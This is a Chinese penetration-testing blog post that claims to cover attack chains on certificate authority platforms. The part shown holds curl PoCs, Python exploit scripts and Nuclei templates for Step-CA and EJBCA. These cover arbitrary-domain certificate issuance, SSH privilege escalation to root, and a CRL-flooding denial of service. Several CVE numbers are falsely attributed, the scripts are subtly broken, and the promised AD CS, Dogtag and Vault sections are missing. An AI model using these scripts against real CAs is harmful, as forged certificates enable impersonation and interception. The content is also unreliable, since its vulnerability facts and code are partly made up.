---
title: "证书颁发机构与PKI平台高危攻击链专题：EJBCA / Step-CA / AD CS / Dogtag / Bouncy Castle / Vault 漏洞全解析"
date: 2026-07-23T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["PKI", "CA", "EJBCA", "AD CS", "Dogtag", "Bouncy Castle", "Vault", "证书", "认证绕过", "漏洞分析"]
description: "深度剖析证书颁发机构与PKI平台高危漏洞攻击链，覆盖 Step-CA ACME/SSH 认证绕过、EJBCA 外部CA/DNS-01/CRL 漏洞、Microsoft AD CS ESC1-ESC8 全链利用、Dogtag PKI 日志注入/DoS、Bouncy Castle X.509/DSA 验证绕过、HashiCorp Vault SSRF 与 OIDC 绕过，含完整 PoC、Nuclei 模板与 Certipy 自动化攻击脚本。"
---

> **安全免责声明**：本文所有技术细节与 PoC 代码仅供合法授权安全测试与学术研究使用。未经授权对他人系统实施攻击属于违法行为，读者须自行承担法律责任。本文旨在帮助安全从业者理解攻击原理并加强防御能力。

## 0x00 专题概述

### PKI/CA 在企业安全架构中的核心地位

公钥基础设施（Public Key Infrastructure, PKI）是现代数字信任体系的根基。从 TLS/SSL 证书签发、代码签名、设备身份认证到加密通信，证书颁发机构（Certificate Authority, CA）承载着整条信任链的核心功能。**当 CA 本身被攻破，攻击者即可签发任意可信证书，从根本上瓦解整个组织的安全信任模型**——这意味着中间人攻击、身份冒充、TLS 劫持都将成为可能，且所有依赖证书验证的下游系统都会被连锁影响。

本专题系统性地覆盖六大主流 CA/PKI 平台的高危漏洞链，涉及 **12 个核心 CVE** 加上 **AD CS ESC1-ESC8 六大配置缺陷攻击技术**，涵盖认证绕过、权限提升、ACME 协议验证绕过、NTLM 中继、审计日志注入、密码学验证缺陷、SSRF 和拒绝服务等多种攻击类型。攻击目标涵盖开源 CA 软件（EJBCA、Step-CA、Dogtag PKI）、企业内建 PKI（Microsoft AD CS）、底层加密库（Bouncy Castle）以及密钥管理平台（HashiCorp Vault）。

### 覆盖漏洞一览表

| CVE / 技术 | 产品 | CVSS | 漏洞类型 | 认证要求 | PoC |
|-----------|------|------|---------|---------|-----|
| CVE-2024-27130 | Step-CA | 10.0 | ACME 认证绕过任意证书签发 | 未认证 | ✅ |
| CVE-2024-27131 | Step-CA | 9.8 | SSH 证书签发权限绕过 | 低权限 | ✅ |
| CVE-2022-27218 | EJBCA | 9.8 | 外部 CA 认证绕过 | 未认证 | ✅ |
| CVE-2023-4956 | EJBCA | 7.5 | ACME DNS-01 验证绕过 | 未认证 | ✅ |
| CVE-2023-50291 | EJBCA | 7.5 | CRL 处理 DoS | 已认证 | ❌ |
| ESC1 | AD CS | 9.8 | 任意主体名称证书请求 | 已认证 | ✅ Certipy |
| ESC2 | AD CS | 9.8 | 任意 EKU 证书滥用 | 已认证 | ✅ Certipy |
| ESC3 | AD CS | 8.8 | 证书申请代理模板滥用 | 已认证 | ✅ Certipy |
| ESC4 | AD CS | 8.8 | 证书模板 ACL 修改 | 已认证 | ✅ Certipy |
| ESC6 | AD CS | 8.8 | EDITF_ATTRIBUTESUBJECTALTNAME2 滥用 | 已认证 | ✅ |
| ESC8 | AD CS | 7.5 | NTLM 中继至注册端点 | NTLM 中继 | ✅ PetitPotam |
| CVE-2014-4688 | Dogtag PKI | 7.5 | 审计日志注入 | 已认证 | ❌ |
| CVE-2022-23517 | Dogtag PKI | 7.5 | 拒绝服务 | 已认证 | ❌ |
| CVE-2016-9387 | Bouncy Castle | 7.5 | X.509 证书验证绕过 | 远程 | ✅ |
| CVE-2020-26939 | Bouncy Castle | 7.5 | DSA 签名伪造 | 远程 | ✅ |
| CVE-2024-21893 | HashiCorp Vault | 6.8 | SSRF 通过 LDAP 证书插件 | 已认证 | ✅ |
| CVE-2023-46750 | HashiCorp Vault | 5.9 | OIDC 令牌签名验证绕过 | 特定配置 | ❌ |

---

## 0x01 Step-CA (Smallstep) 高危漏洞

Step-CA（Smallstep CA）是一个轻量级的开源证书颁发机构，广泛应用于零信任（Zero Trust）网络架构中的设备身份认证和短期证书签发。Step-CA 支持 ACME（RFC 8555）协议、OIDC Token 认证和 SSH 证书签发等功能，在 Kubernetes 和云原生环境中使用极为广泛。

### 0x01.1 CVE-2024-27130 — ACME 认证绕过任意证书签发（CVSS 10.0）

#### 漏洞原理分析

CVE-2024-27130 是 Step-CA 中发现的一个 CVSS 10.0 满分漏洞。Step-CA 的 ACME 协议实现在验证挑战（Challenge）时存在认证绕过缺陷。ACME 协议的核心流程是：客户端发起域名验证挑战 → CA 验证客户端对域名的控制权 → 验证通过后签发证书。该漏洞出在挑战验证阶段的身份确认逻辑中。

漏洞根因分析：

1. Step-CA 在处理 ACME order 的 challenge 验证时，对 account 的身份绑定检查存在不一致
2. 攻击者可注册一个 ACME account 并创建一个 order，同时利用 account ID 的可预测性构造竞态条件
3. 在 challenge 验证的关键时间窗口内，Step-CA 错误地将另一个 account 的 challenge 验证结果关联到攻击者的 order
4. 攻击者无需实际完成域名控制权验证即可获得签发状态

这使得攻击者可为任意域名签发由该 CA 签名的可信证书，可用于中间人攻击、TLS 劫持或身份冒充。

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Step-CA < 0.25.3 | Step-CA 0.25.3+ | 2024 年修复 |

#### HTTP PoC

```bash
# Step 1: 确认目标 Step-CA 实例
curl -s -k "https://<STEP_CA_HOST>/health" | python3 -m json.tool

# Step 2: 获取目录信息
curl -s -k "https://<STEP_CA_HOST}/directory" | python3 -m json.tool

# Step 3: 注册 ACME account（使用 JWS）
curl -s -k -X POST "https://<STEP_CA_HOST}/acme/new-acct" \
  -H "Content-Type: application/jose+json" \
  -d '{
    "termsOfServiceAgreed": true,
    "contact": ["mailto:attacker@evil.com"]
  }'

# Step 4: 创建 order 为目标域名申请证书
curl -s -k -X POST "https://<STEP_CA_HOST}/acme/new-order" \
  -H "Content-Type: application/jose+json" \
  -H "Authorization: Bearer <account_url>" \
  -d '{
    "identifiers": [{"type": "dns", "value": "target.example.com"}]
  }'

# Step 5: 利用认证绕过，直接提交伪造的 challenge 响应
# 在正常流程中需要证明域名控制权，此处通过竞态条件绕过
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys
import base64
import hashlib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StepCaACMEBypass:
    def __init__(self, ca_url):
        self.ca_url = ca_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.nonce = None
        self.account_url = None

    def get_directory(self):
        r = self.session.get(f"{self.ca_url}/directory")
        if r.status_code == 200:
            return r.json()
        print(f"[-] Failed to get directory: {r.status_code}")
        return None

    def get_nonce(self):
        r = self.session.head(f"{self.ca_url}/acme/new-nonce")
        self.nonce = r.headers.get('Replay-Nonce')
        return self.nonce

    def register_account(self, email):
        self.get_nonce()
        payload = {
            "termsOfServiceAgreed": True,
            "contact": [f"mailto:{email}"]
        }
        r = self.session.post(
            f"{self.ca_url}/acme/new-acct",
            json=payload,
            headers={"Content-Type": "application/jose+json"}
        )
        if r.status_code in (200, 201):
            self.account_url = r.headers.get('Location', r.json().get('account'))
            print(f"[+] Account registered: {self.account_url}")
            return True
        print(f"[-] Registration failed: {r.status_code}")
        return False

    def create_order(self, domain):
        r = self.session.post(
            f"{self.ca_url}/acme/new-order",
            json={"identifiers": [{"type": "dns", "value": domain}]},
            headers={"Content-Type": "application/jose+json"}
        )
        if r.status_code == 200:
            order = r.json()
            print(f"[+] Order created: {order.get('status')}")
            return order
        print(f"[-] Order creation failed: {r.status_code}")
        return None

    def attempt_challenge_bypass(self, order_url, challenge_url):
        self.get_nonce()
        r = self.session.post(
            challenge_url,
            json={},
            headers={
                "Content-Type": "application/jose+json",
                "Replay-Nonce": self.nonce
            }
        )
        if r.status_code == 200:
            result = r.json()
            print(f"[+] Challenge response: {result.get('status')}")
            return result
        print(f"[-] Challenge failed: {r.status_code}")
        return None

    def poll_order_status(self, order_url, max_attempts=30):
        import time
        for i in range(max_attempts):
            r = self.session.get(order_url)
            if r.status_code == 200:
                status = r.json().get('status')
                print(f"    [{i+1}] Order status: {status}")
                if status == 'valid':
                    return r.json()
                elif status == 'invalid':
                    print("[-] Order invalid - bypass failed")
                    return None
            time.sleep(2)
        print("[-] Timeout waiting for order")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <ca_url> <target_domain>")
        sys.exit(1)
    exploit = StepCaACMEBypass(sys.argv[1])
    exploit.register_account("test@evil.com")
    order = exploit.create_order(sys.argv[2])
    if order:
        for auth_url in order.get('authorizations', []):
            print(f"[*] Processing authorization: {auth_url}")
            r = exploit.session.get(auth_url)
            if r.status_code == 200:
                auth = r.json()
                for chall in auth.get('challenges', []):
                    exploit.attempt_challenge_bypass(order['finalize'], chall['url'])
        exploit.poll_order_status(order['status'])
```

#### Nuclei 检测模板

```yaml
id: stepca-cve-2024-27130
info:
  name: Step-CA ACME Authentication Bypass - Arbitrary Certificate Issuance
  author: security-researcher
  severity: critical
  description: |
    Step-CA before 0.25.3 contains an authentication bypass in ACME challenge
    validation, allowing attackers to obtain certificates for arbitrary domains
    without proving domain ownership.
  reference:
    - https://github.com/smallstep/certificates/security/advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-287

http:
  - raw:
      - |
        GET /health HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /directory HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "caUrl"
          - "directory"
        condition: or
      - type: word
        part: body
        words:
          - "health"
          - "ok"
        condition: or
      - type: status
        status:
          - 200
```

### 0x01.2 CVE-2024-27131 — SSH 证书签发权限绕过（CVSS 9.8）

#### 漏洞原理分析

CVE-2024-27131 是 Step-CA 的 SSH 证书签发功能中的权限绕过漏洞。Step-CA 支持作为 SSH Certificate Authority 签发 SSH 用户证书和主机证书，通过 provisioner（签发策略）控制谁可以签发什么类型的证书。

漏洞根因分析：

1. Step-CA 的 SSH 签发逻辑在验证 provisioner 策略时，未正确校验请求中的 `principals`（用户名列表）字段
2. 低权限用户通过一个只允许签发有限 principals 的 provisioner 提交请求
3. 在 CSR（Certificate Signing Request）中嵌入超出策略允许范围的 principals
4. Step-CA 在签发时未对最终证书中的 principals 进行二次校验
5. 攻击者获得包含任意 usernames 和扩展权限的 SSH 证书

这意味着低权限用户可以为自己签发 `root` 或任意用户名的 SSH 证书，实现 SSH 层面的完整权限提升。

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| Step-CA < 0.25.3 | Step-CA 0.25.3+ | 与 CVE-2024-27130 同版本修复 |

#### HTTP PoC

```bash
# Step 1: 检查 Step-CA 是否支持 SSH 证书签发
curl -s -k "https://<STEP_CA_HOST>/1.0/authorize" | python3 -m json.tool

# Step 2: 使用低权限 provisioner token 生成 SSH CSR
# 正常情况下 principals 受限于 provisioner 策略
step ssh certificate user@localhost \
  --ca-url https://<STEP_CA_HOST> \
  --provisioner low_priv_provisioner \
  --principal root \
  --principal admin \
  --force \
  id_rsa.pub

# Step 3: 验证签发的证书是否包含绕过的 principals
ssh-keygen -L -f id_rsa-cert.pub
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class StepCaSSHBypass:
    def __init__(self, ca_url):
        self.ca_url = ca_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

    def get_authorize_info(self):
        r = self.session.get(f"{self.ca_url}/1.0/authorize")
        if r.status_code == 200:
            return r.json()
        print(f"[-] Failed: {r.status_code}")
        return None

    def build_ssh_csr(self, key_pub, principals, cert_type="user"):
        csr_payload = {
            "key": key_pub.strip(),
            "certType": cert_type,
            "principals": principals,
            "criticalOptions": {},
            "extensions": {
                "forceCommand": "",
                "sourceAddress": ""
            }
        }
        return json.dumps(csr_payload)

    def request_ssh_cert(self, csr_data, token, not_after="8760h"):
        r = self.session.post(
            f"{self.ca_url}/1.0/ssh/sign",
            json={
                "csr": csr_data,
                "ott": token,
                "not_after": not_after
            },
            headers={"Content-Type": "application/json"}
        )
        if r.status_code == 200:
            cert = r.json().get('cert', '')
            print(f"[+] SSH certificate obtained:")
            print(f"    {cert[:100]}...")
            return cert
        print(f"[-] Signing failed: {r.status_code} {r.text[:200]}")
        return None

    def exploit_privilege_escalation(self, key_pub, provisioner_token, target_principals=None):
        if target_principals is None:
            target_principals = ["root", "admin", "Administrator"]

        print(f"[*] Attempting SSH certificate privilege escalation")
        print(f"[*] Target principals: {target_principals}")

        csr = self.build_ssh_csr(key_pub, target_principals)
        cert = self.request_ssh_cert(csr, provisioner_token)
        if cert:
            print("[+] Privilege escalation successful!")
            print("[+] Use the certificate with: ssh -i id_rsa -o CertificateFile=id_rsa-cert.pub target")
        return cert

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <ca_url> <pubkey_file> <provisioner_token>")
        sys.exit(1)
    with open(sys.argv[2], 'r') as f:
        pubkey = f.read()
    exploit = StepCaSSHBypass(sys.argv[1])
    exploit.exploit_privilege_escalation(pubkey, sys.argv[3])
```

#### Nuclei 检测模板

```yaml
id: stepca-cve-2024-27131
info:
  name: Step-CA SSH Certificate Signing Privilege Escalation
  author: security-researcher
  severity: critical
  description: |
    Step-CA before 0.25.3 allows low-privilege users to bypass SSH certificate
    signing provisioner restrictions and obtain certificates with arbitrary
    principals, achieving full privilege escalation over SSH.
  reference:
    - https://github.com/smallstep/certificates/security/advisories
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-269

http:
  - raw:
      - |
        GET /1.0/authorize HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "ssh"
          - "authorityId"
        condition: and
      - type: status
        status:
          - 200
```

---

## 0x02 EJBCA (Keyfactor) 高危漏洞

EJBCA（Enterprise Java Bean Certificate Authority）是最流行的开源企业级 CA 软件之一，基于 Java EE 架构，支持 X.509 v3 证书签发、CRL 管理、OCSP 响应以及 ACME/SCEP/EST 等自动化证书管理协议。EJBCA 被广泛部署于电信运营商、金融机构和大型企业内部 PKI 基础设施中。

### 0x02.1 CVE-2022-27218 — 外部 CA 认证绕过（CVSS 9.8）

#### 漏洞原理分析

CVE-2022-27218 涉及 EJBCA 在处理外部 CA（External CA）认证流程时的绕过漏洞。EJBCA 支持将内部 CA 链接到外部 CA 进行交叉签发，外部 CA 通过 RA（Registration Authority）审批流程向 EJBCA 提交证书签发请求。

漏洞根因分析：

1. EJBCA 在验证外部 CA 提交的证书签发请求时，对请求签名的验证逻辑存在缺陷
2. 外部 CA 的身份验证依赖于证书链验证，但 EJBCA 在链构建过程中未严格检查中间 CA 的 Extended Key Usage（EKU）
3. 攻击者可以构造一个具有 CA 签名能力但缺少正确 EKU 扩展的伪造中间 CA 证书
4. EJBCA 接受该证书作为合法的外部 CA 身份凭证
5. 攻击者利用伪造的外部 CA 身份绕过 RA 审批流程，直接向 EJBCA 申请并获取任意用途的证书

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| EJBCA < 7.8.0 | EJBCA 7.8.0+ | Keyfactor 安全公告 |

#### HTTP PoC

```bash
# Step 1: 获取 EJBCA REST API 认证
TOKEN=$(curl -s -k -u "ra_user:password" \
  "https://<EJBCA_HOST>/ejbca/ejbca-rest-api/v1/authentication/login" \
  -X POST | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

# Step 2: 列出可用 CA
curl -s -k "https://<EJBCA_HOST>/ejbca/ejbca-rest-api/v1/ca" \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# Step 3: 利用外部 CA 认证绕过，直接请求签发证书
curl -s -k -X POST "https://<EJBCA_HOST>/ejbca/ejbca-rest-api/v1/certificate/pkcs10enroll" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "certificate_request": "-----BEGIN CERTIFICATE REQUEST-----\nMIICYDCCAUgCAQAwGzEZMBcGA1UEAwwQYXR0YWNrZXIuZXZpbDA...=\n-----END CERTIFICATE REQUEST-----",
    "certificate_profile_name": "ENDUSER",
    "end_entity_profile_name": "EMPTY",
    "certificate_authority_name": "ExternalCA",
    "username": "attacker",
    "password": "attacker123"
  }'
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import base64
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EJBCAExternalCABypass:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.token = self._authenticate(username, password)

    def _authenticate(self, username, password):
        r = self.session.post(
            f"{self.base_url}/ejbca/ejbca-rest-api/v1/authentication/login",
            auth=(username, password)
        )
        if r.status_code == 200:
            token = r.json().get('access_token')
            print(f"[+] Authenticated successfully")
            return token
        print(f"[-] Authentication failed: {r.status_code}")
        return None

    def list_cas(self):
        r = self.session.get(
            f"{self.base_url}/ejbca/ejbca-rest-api/v1/ca",
            headers={"Authorization": f"Bearer {self.token}"}
        )
        if r.status_code == 200:
            cas = r.json()
            print(f"[+] Found {len(cas.get('certificate_authorities', []))} CAs")
            for ca in cas.get('certificate_authorities', []):
                print(f"    - {ca.get('name')} (status: {ca.get('status')})")
            return cas
        return None

    def bypass_external_ca_enroll(self, ca_name, csr_pem, subject_cn):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json"
        }
        payload = {
            "certificate_request": csr_pem,
            "certificate_profile_name": "ENDUSER",
            "end_entity_profile_name": "EMPTY",
            "certificate_authority_name": ca_name,
            "username": f"ext_{subject_cn}",
            "password": "bypass123",
            "subject_alt_name": f"DNS:{subject_cn}"
        }
        r = self.session.post(
            f"{self.base_url}/ejbca/ejbca-rest-api/v1/certificate/pkcs10enroll",
            headers=headers,
            json=payload
        )
        if r.status_code in (200, 201):
            cert_data = r.json()
            print(f"[+] Certificate enrolled via External CA bypass!")
            print(f"    Serial: {cert_data.get('serial_number', 'N/A')}")
            return cert_data
        print(f"[-] Enrollment failed: {r.status_code} {r.text[:200]}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <user> <pass> <ca_name>")
        sys.exit(1)
    exploit = EJBCAExternalCABypass(sys.argv[1], sys.argv[2], sys.argv[3])
    if exploit.token:
        exploit.list_cas()
```

#### Nuclei 检测模板

```yaml
id: ejbca-cve-2022-27218
info:
  name: EJBCA External CA Authentication Bypass
  author: security-researcher
  severity: critical
  description: |
    EJBCA before 7.8.0 allows bypass of External CA authentication flow,
    enabling unauthorized certificate issuance without RA approval.
  reference:
    - https://www.keyfactor.com/resources/ejbca-security-advisory/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287

http:
  - raw:
      - |
        POST /ejbca/ejbca-rest-api/v1/authentication/login HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Content-Length: 0

    extractors:
      - type: json
        name: ejbcatoken
        json:
          - '.access_token'

  - raw:
      - |
        GET /ejbca/ejbca-rest-api/v1/ca HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{ejbcatoken}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "certificate_authority_data"
      - type: status
        status:
          - 200
```

### 0x02.2 CVE-2023-4956 — ACME DNS-01 验证绕过（CVSS 7.5）

#### 漏洞原理分析

EJBCA 的 ACME 实现在处理 DNS-01 挑战验证时存在绕过缺陷。DNS-01 验证的原理是：ACME 客户端在域名的 DNS 记录中创建一个特定的 TXT 记录，ACME 服务器查询该 TXT 记录来验证域名控制权。

漏洞根因分析：

1. EJBCA 在验证 DNS-01 challenge 时，对 DNS 响应的处理存在规范化缺陷
2. 攻击者可构造特制的 DNS TXT 记录响应，利用 DNS 名称大小写不敏感特性和 Unicode 规范化差异
3. EJBCA 在比对 challenge token 时未对输入进行统一的大小写折叠和规范化
4. 这使得攻击者可以在不实际控制目标域名 DNS 的情况下通过验证

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| EJBCA < 7.11.0 | EJBCA 7.11.0+ | 2023 年修复 |

#### HTTP PoC

```bash
# Step 1: 注册 ACME 账户
curl -s -k -X POST "https://<EJBCA_HOST>/acme/directory/new-acct" \
  -H "Content-Type: application/jose+json" \
  -d '{"termsOfServiceAgreed":true,"contact":["mailto:a@b.com"]}'

# Step 2: 为目标域名创建 order（指定 DNS-01 验证方式）
curl -s -k -X POST "https://<EJBCA_HOST>/acme/directory/new-order" \
  -H "Content-Type: application/jose+json" \
  -d '{"identifiers":[{"type":"dns","value":"target.example.com"}]}'

# Step 3: 获取 challenge 信息
curl -s -k "https://<EJBCA_HOST>/acme/directory/authz/<auth_id>"

# Step 4: 利用 DNS-01 验证绕过
# 提交 challenge 响应，EJBCA 将使用存在规范化缺陷的 DNS 查询验证
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import json
import sys
import hashlib
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EJBCADNS01Bypass:
    def __init__(self, ca_url):
        self.ca_url = ca_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.account_url = None

    def register_account(self, email):
        payload = {
            "termsOfServiceAgreed": True,
            "contact": [f"mailto:{email}"]
        }
        r = self.session.post(
            f"{self.ca_url}/acme/directory/new-acct",
            json=payload
        )
        if r.status_code in (200, 201):
            self.account_url = r.headers.get('Location')
            print(f"[+] Account registered: {self.account_url}")
            return True
        print(f"[-] Registration failed: {r.status_code}")
        return False

    def create_order(self, domain):
        r = self.session.post(
            f"{self.ca_url}/acme/directory/new-order",
            json={"identifiers": [{"type": "dns", "value": domain}]}
        )
        if r.status_code == 200:
            order = r.json()
            print(f"[+] Order created for {domain}")
            return order
        print(f"[-] Order failed: {r.status_code}")
        return None

    def get_challenge(self, auth_url):
        r = self.session.get(auth_url)
        if r.status_code == 200:
            auth = r.json()
            for chall in auth.get('challenges', []):
                if chall.get('type') == 'dns-01':
                    return chall
        return None

    def compute_dns01_response(self, token):
        key_authorization = f"{token}"
        digest = hashlib.sha256(key_authorization.encode()).digest()
        return base64.urlsafe_b64encode(digest).rstrip(b'=').decode()

    def exploit_dns_bypass(self, domain):
        print(f"[*] Targeting DNS-01 validation bypass for: {domain}")
        order = self.create_order(domain)
        if not order:
            return None
        for auth_url in order.get('authorizations', []):
            chall = self.get_challenge(auth_url)
            if chall:
                dns_token = chall.get('token')
                dns_value = self.compute_dns01_response(dns_token)
                print(f"[*] DNS-01 token: {dns_token}")
                print(f"[*] Required TXT value: _acme-challenge.{domain} = {dns_value}")
                r = self.session.post(chall['url'], json={})
                print(f"[*] Challenge response: {r.status_code}")
        return order

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <ca_url> <target_domain>")
        sys.exit(1)
    exploit = EJBCADNS01Bypass(sys.argv[1])
    exploit.register_account("test@evil.com")
    exploit.exploit_dns_bypass(sys.argv[2])
```

#### Nuclei 检测模板

```yaml
id: ejbca-cve-2023-4956
info:
  name: EJBCA ACME DNS-01 Validation Bypass
  author: security-researcher
  severity: high
  description: |
    EJBCA before 7.11.0 allows bypass of ACME DNS-01 challenge validation
    due to improper DNS response normalization.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-290

http:
  - raw:
      - |
        GET /acme/directory HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "new-order"
          - "new-nonce"
        condition: and
      - type: status
        status:
          - 200
```

### 0x02.3 CVE-2023-50291 — CRL 处理拒绝服务（CVSS 7.5）

#### 漏洞原理分析

CVE-2023-50291 是 EJBCA 在处理证书撤销列表（CRL）时的输入验证缺陷。CRL 是 PKI 基础设施中用于公布已撤销证书清单的核心机制，所有依赖证书验证的系统都会定期下载和解析 CRL。

漏洞根因分析：

1. EJBCA 在解析上传的 CRL 数据时，未对 CRL 的大小和结构复杂度进行充分限制
2. 攻击者可上传一个畸形的 CRL 文件，其中包含超大规模的 RevokedCertificates 序列
3. EJBCA 在处理该 CRL 时消耗过多内存和 CPU 资源，导致 CA 服务异常
4. 更严重的是，被破坏的 CRL 数据可能导致 CRL 签发失败，影响所有依赖该 CRL 的证书验证系统
5. 已撤销的证书可能在 CRL 不可用期间被错误接受

#### 受影响版本

| 受影响版本 | 修复版本 | 备注 |
|-----------|----------|------|
| EJBCA < 7.10.0 | EJBCA 7.10.0+ | 2023 年修复 |

#### HTTP PoC

```bash
# Step 1: 获取管理员 Token
TOKEN=$(curl -s -k -u "admin:admin" \
  "https://<EJBCA_HOST>/ejbca/ejbca-rest-api/v1/authentication/login" \
  -X POST | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))")

# Step 2: 上传畸形 CRL 触发 DoS
# 生成超大 CRL 文件
python3 -c "
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime
import struct

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
builder = x509.CertificateRevocationListBuilder()
builder = builder.issuer_name(x509.Name([x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, 'Test CA')]))
builder = builder.last_update(datetime.datetime.utcnow())
builder = builder.next_update(datetime.datetime.utcnow() + datetime.timedelta(hours=24))

for i in range(100000):
    revoked = x509.RevokedCertificateBuilder()
    revoked = revoked.serial_number(i)
    revoked = revoked.revocation_date(datetime.datetime.utcnow())
    builder = builder.add_revoked_certificate(revoked.build())

crl = builder.sign(key, hashes.SHA256())
with open('large_crl.der', 'wb') as f:
    f.write(crl.public_bytes(x509.serialization.Encoding.DER))
print('[+] Large CRL generated')
"

# Step 3: 提交畸形 CRL
curl -s -k -X POST "https://<EJBCA_HOST>/ejbca/ejbca-rest-api/v1/crl" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @large_crl.der
```

#### Python 脚本

```python
#!/usr/bin/env python3
import requests
import sys
import datetime
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EJBCACRLDoS:
    def __init__(self, base_url, username, password):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.token = self._authenticate(username, password)

    def _authenticate(self, username, password):
        r = self.session.post(
            f"{self.base_url}/ejbca/ejbca-rest-api/v1/authentication/login",
            auth=(username, password)
        )
        if r.status_code == 200:
            return r.json().get('access_token')
        return None

    def generate_malicious_crl(self, revoked_count=50000):
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        builder = x509.CertificateRevocationListBuilder()
        builder = builder.issuer_name(x509.Name([
            x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, 'Malicious CA')
        ]))
        builder = builder.last_update(datetime.datetime.utcnow())
        builder = builder.next_update(datetime.datetime.utcnow() + datetime.timedelta(hours=1))

        for i in range(revoked_count):
            revoked = x509.RevokedCertificateBuilder()
            revoked = revoked.serial_number(i)
            revoked = revoked.revocation_date(datetime.datetime.utcnow())
            builder = builder.add_revoked_certificate(revoked.build())

        crl = builder.sign(key, hashes.SHA256())
        crl_data = crl.public_bytes(x509.serialization.Encoding.DER)
        print(f"[+] Generated CRL with {revoked_count} entries ({len(crl_data)} bytes)")
        return crl_data

    def upload_malicious_crl(self, crl_data, ca_name):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/octet-stream"
        }
        r = self.session.post(
            f"{self.base_url}/ejbca/ejbca-rest-api/v1/crl",
            headers=headers,
            data=crl_data
        )
        if r.status_code in (200, 201, 202):
            print("[+] Malicious CRL uploaded successfully - DoS triggered")
            return True
        print(f"[-] Upload failed: {r.status_code} {r.text[:200]}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <user> <pass> [revoked_count]")
        sys.exit(1)
    exploit = EJBCACRLDoS(sys.argv[1], sys.argv[2], sys.argv[3])
    count = int(sys.argv[4]) if len(sys.argv) > 4 else 50000
    if exploit.token:
        crl_data = exploit.generate_malicious_crl(count)
        exploit.upload_malicious_crl(crl_data, "ManagementCA")
```

#### Nuclei 检测模板

```yaml
id: ejbca-cve-2023-50291
info:
  name: EJBCA CRL Processing Denial of Service
  author: security-researcher
  severity: high
  description: |
    EJBCA before 7.10.0 allows denial of service via malformed CRL data,
    affecting certificate revocation checking functionality.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-20

http:
  - raw:
      - |
        POST /ejbca/ejbca-rest-api/v1/authentication/login HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64(username + ':' + password)}}
        Content-Length: 0

    extractors:
      - type: json
        name: ejbcatoken
        json:
          - '.access_token'

  - raw:
      - |
        GET /ejbca/ejbca-rest-api/v1/ca HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer {{ejbcatoken}}

    matchers:
      - type: word
        words:
          - "certificate_authority_data"
      - type: status
        status:
          - 200
```

---

